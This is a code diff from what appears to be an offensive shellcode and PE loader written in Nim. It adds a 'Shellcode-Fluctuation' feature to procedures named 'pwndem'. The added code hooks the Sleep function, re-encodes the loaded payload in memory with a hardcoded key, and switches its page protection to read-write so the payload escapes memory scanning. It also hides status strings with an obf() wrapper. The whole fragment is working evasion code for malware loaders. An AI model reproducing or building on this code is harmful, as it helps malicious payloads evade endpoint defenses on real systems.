@@ -1233,7 +1233,22 @@ proc pwndem[byte](friendlycode: openarray[byte]): void =
             PAGE_EXECUTE_READ_WRITE
         )
 
-    
+    when defined(Fluctuate):
+        g_fluctuationData.shellcodeAddr = unsafeAddr friendlycode[0]
+        g_fluctuationData.shellcodeSize = SIZE_T(friendlycode.len)
+        # Will change the hardcoded key later on
+        when defined(amd64):
+            g_fluctuationData.encodeKey = 0x1337DE4D
+        when defined(i386):
+            g_fluctuationData.encodeKey = 0x1337
+        g_fluctuationData.currentlyEncrypted = false
+        g_fluctuationData.protect = PAGE_READWRITE
+        g_fluctuate = FluctuateToRW
+        if (hookSleep()):
+            echo obf("Hooked Sleep successfully for Shellcode-Fluctuation!")
+        else:
+            echo obf("Failed to hook Sleep for Shellcode-Fluctuation!")
+
     var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtAlloc) + cast[HANDLE](SYSCALL_STUB_SIZE)
     
     var oldProtection: DWORD = 0
@@ -1449,6 +1464,22 @@ proc pwndem(): void =
     preferAddr = cast[LPVOID](ntHeader.OptionalHeader.ImageBase)
     
     echo $ntHeader.OptionalHeader.SizeOfImage
+
+    when defined(Fluctuate):
+        g_fluctuationData.shellcodeAddr = dectext[0].addr
+        g_fluctuationData.shellcodeSize = size_t(ntHeader.OptionalHeader.SizeOfImage)
+        # Will change the hardcoded key later on
+        when defined(amd64):
+            g_fluctuationData.encodeKey = 0x1337DE4D
+        when defined(i386):
+            g_fluctuationData.encodeKey = 0x1337
+        g_fluctuationData.currentlyEncrypted = false
+        g_fluctuationData.protect = PAGE_READWRITE
+        g_fluctuate = FluctuateToRW
+        if (hookSleep()):
+            echo obf("Hooked Sleep successfully for Shellcode-Fluctuation!")
+        else:
+            echo obf("Failed to hook Sleep for Shellcode-Fluctuation!")
     
     var allocsize: SIZE_T = cast[SIZE_T](ntHeader.OptionalHeader.SizeOfImage)
     var ds: LPVOID
